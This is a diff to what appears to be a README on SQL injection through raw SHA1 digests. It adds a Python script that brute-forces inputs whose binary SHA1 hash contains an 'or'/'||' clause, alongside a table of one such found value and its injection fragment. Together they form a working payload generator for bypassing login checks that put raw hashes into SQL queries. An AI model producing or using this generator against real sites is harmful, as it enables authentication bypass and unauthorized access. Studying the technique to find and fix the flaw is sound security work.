@@ -4,7 +4,35 @@
 | -------------------------- |:---------------------------------------------:|:---------------------:|:------:|:--------:|
 | 5651578060603509           |96009c0bafe7be05e23b0079226f7222d82fee88       |E&�ɶ��'\|\|'8�vjc\�   |'\|\|'8 |0xJohannes|
 
+# PAYLOAD GENERATION
+```python
+#!/usr/bin/python
+ # -*- coding: utf-8 -*
+import hashlib
+import re
+a = re.compile("'or'\d")
+b = re.compile("'\|\|'\d")
+d = re.compile("'OR'\d")
+e = re.compile("'Or'\d")
+f = re.compile("'oR'\d")
+from random import randint
 
+identifier = True
+while identifier:
+    rand=randint(0, 10000)
+    rand1=randint(0, 10000)
+    rand2=randint(0, 10000)
+    rand3=randint(0, 10000)
+    value='{}{}{}{}'.format(rand,rand1,rand2,rand3)
+    hashed = hashlib.sha1(value).digest()
+    hastrip = hashed.strip()
+    print hastrip
+    if a.search(hastrip)!=None or b.search(hastrip)!=None or d.search(hastrip)!=None or e.search(hastrip)!=None or f.search(hastrip)!=None:
+        identifier = False
+        print hashed
+        print value
+        break
+```
 #  EXAMPLE USAGE
 
 ```php
